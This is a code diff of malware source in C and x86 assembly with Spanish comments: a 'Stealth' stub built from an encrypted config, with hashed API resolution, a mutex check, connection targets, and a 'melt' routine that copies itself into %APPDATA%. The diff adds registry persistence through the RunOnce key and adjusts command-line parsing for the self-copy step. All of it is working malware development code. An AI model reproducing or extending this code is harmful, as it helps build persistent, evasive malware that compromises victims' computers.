@@ -6,7 +6,7 @@
 **    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
 *###############################################################################*/
 #include "macros.h"
-INCLUDE_PYSRC(..\..\builder\intrabuilder.py)
+INCLUDE_PYSRC(..\builder\intrabuilder.py)
 
 #define API_DEFINE(...) PYTHON_FUNCTION()
 #define VAR_DEFINE(...) PYTHON_FUNCTION()
@@ -42,6 +42,7 @@ def MY_CONFIG():
     b = Builder()
     b.addBlob(blob)
     b.addString("Stealth")
+    b.addString("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
     b.addTargets([[0x932B, "127.0.0.1"]])
     b.addDword(0)
     b.addDword(0)
@@ -137,14 +138,18 @@ ws2_32_symbol_hashes:
         API_DEFINE("recv")
 
 advapi32_symbol_hashes:
-        #define advapi32_count	4
+        #define advapi32_count    7
         API_DEFINE("CryptAcquireContextA")
         API_DEFINE("CryptSetKeyParam")
         API_DEFINE("CryptImportKey")
         API_DEFINE("CryptDecrypt")
+        API_DEFINE("RegCreateKeyA")
+        API_DEFINE("RegCloseKey")
+        API_DEFINE("RegSetValueA")
 #pragma endregion
 
 #pragma region VARS
+        VAR_DEFINE("RegPath")
         VAR_DEFINE("CommandLine")
         VAR_DEFINE("APPDATA")
         VAR_DEFINE("DAT_NFO")
@@ -159,8 +164,7 @@ advapi32_symbol_hashes:
         VAR_DEFINE("TARGETS")
         VAR_DEFINE("PORT")
 #pragma endregion
-
-//¡¡¡¡CONSTANTES TEMPORALES!!!!
+#pragma endregion
     __asm{
 over_hashes:
         jmp over_fncs
@@ -235,12 +239,22 @@ CreateBuff:
         call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
 #endif //ERR_CHECK
         ret
+#ifdef MELT
+SkipQuote:
+        cmp BYTE PTR[esi], '"'          //v
+        jne DoNotSkip1                  //v
+        inc  esi                        //v
+        inc  esi                        //> Saltamos la primera comilla
+DoNotSkip:
+        ret
+#endif //MELT
 over_fncs:
         //Saltamos sobre la configuración
         jmp  to_start
     }
+
 config_start:
-KEY:   	//typedef struct aes128Blob{
+KEY:       //typedef struct aes128Blob{
             //BLOBHEADER{
                 /*bType*/       //EMIT_BYTE(PLAINTEXTKEYBLOB)
                 /*bVersion*/    //EMIT_BYTE(CUR_BLOB_VERSION)
@@ -248,7 +262,7 @@ KEY:   	//typedef struct aes128Blob{
                 /*aiKeyAlg*/    //EMIT_DWORD(CALG_AES_128)
             //}
             /*keySize*/         //EMIT_DWORD(0x10)
-            /*keydata[16]*/     //EMIT_BYTE_ARRAY((0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))	
+            /*keydata[16]*/     //EMIT_BYTE_ARRAY((0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))    
             //SHA1("karcrack:1234")
         //}
         /*
@@ -264,11 +278,9 @@ HOST2:  EMIT_BYTE_ARRAY(('l') ('o') ('c') ('a') ('l') ('h') ('o') ('s') ('t')(0)
 
         MY_CONFIG( )
 
-        //EMIT_BYTE_ARRAY((0xA4)(0x7B)(0xCF)(0xD1)(0xF9)(0x71)(0x72)(0xB1)(0xBC)(0x79)(0xCF)(0xD1)(0x94)(0x1F)(0x29)(0xD7)(0x77)(0xAF)(0xFC)(0xE0)(0x4)(0x97)(0xAB)(0xC4)(0xF5)(0x95)(0xF7)(0xD5)(0xA4)(0x63)(0x17)(0xD0)(0xC0)(0xD)(0xA7)(0xD1)(0xDC)(0x84)(0x6)(0xC3)(0xC3)(0x15)(0xA0)(0xBD)(0x98)(0x39)(0x11)(0xDE)(0xC1)(0x79)(0xE4)(0x42)(0xC6)(0x25)(0x45)(0x9F)(0x9C)(0x57)(0xFF)(0xFF)(0xC6)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1)(0xF7)(0x17)(0x72)(0xB1)(0xAC)(0x79)(0xCF)(0xD1))
-
 #define CONFIG_SIZE 128
 config_end:
-#pragma endregion
+
     __asm{
 to_start:
         /*###############################################################################
@@ -302,8 +314,6 @@ to_start:
         ** recorremos el bloque de environments en busca de \0APPDATA=*
         *###############################################################################*/
         mov  edi, [eax+0x44]            //v
-        inc  edi                        //v
-        inc  edi                        //>Saltamos el '"'
         mov  [ebp+_CommandLine], edi    //>Almacenamos el puntero a CommandLine
         mov  esi, [eax+0x48]            //ESI = Environment
 
@@ -414,10 +424,16 @@ xornext:
         mov  [ebp+_pKEY], eax           //
         lea  esi, [eax+0x1C]            //ESI = &mutex
         mov  [ebp+_pMUTEX], esi         //
-        add  esi, 0x8                   //ESI = &Targets
-        mov  [ebp+_TARGETS], esi        //
-        dec  esi                        //ESI-=1 (Hacemos esto para que load_next_target empiece en el target 0)
+        add  esi, 0x8                   //ESI = &RegPath
+        mov  [ebp+_RegPath], esi        //
+        cdq                             //EDX = 0
+repeat: inc  esi
+        mov  dl, BYTE PTR[esi]          //DL  = RegPath[n]
+        test dl, dl                     //v
+        jnz  repeat                     //> Saltamos el RegPath
         mov  [ebp+_pHOST], esi          //
+        inc  esi                        //
+        mov  [ebp+_TARGETS], esi        //
 
         /*###############################################################################
         **                          Comprobación del Mutex
@@ -456,8 +472,12 @@ nomtx:
         *###############################################################################*/
 #ifdef MELT
         mov  edi, [ebp+_CommandLine]    //EDI = &CommandLine
+        mov  esi, edi                    //v
+        call SkipQuote                    //> Saltamos la primera comilla de hacer falta
+        mov  edi, esi                    //^
         push edi                        //Guardamos &CommandLine para luego
         mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
+        call SkipQuote                    //> Saltamos la primera comilla de haberla
         cdq                             //EDX = 0
         //Comprobamos si estamos en %APPDATA%
 next_char:
@@ -470,7 +490,7 @@ next_char:
 
         mov  edi, eax                   //EDI = EAX
         mov  esi, [ebp+_APPDATA]        //ESI = &APPDATA
-        mov  [ebp+_APPDATA], edi        //Guardamos en _APPDATA la nuestra nueva ruta
+        mov  [ebp+_APPDATA], edi        //Guardamos en _APPDATA la nueva ruta
 
         //Copiamos %APPDATA% en el buffer
         mov  al, '"'                    //v
@@ -542,6 +562,7 @@ do_not_copy://(Somos la copia)
         mov  al, '\\'
         stosb
         //EDI = %APPDATA%
+        //OBTENEMOS NUESTRO NOMBRE Y LE CAMBIAMOS LA EXTENSION
         mov  edx, edi
         mov  edi, [ebp+_CommandLine]
 save:   mov  ebx, edi
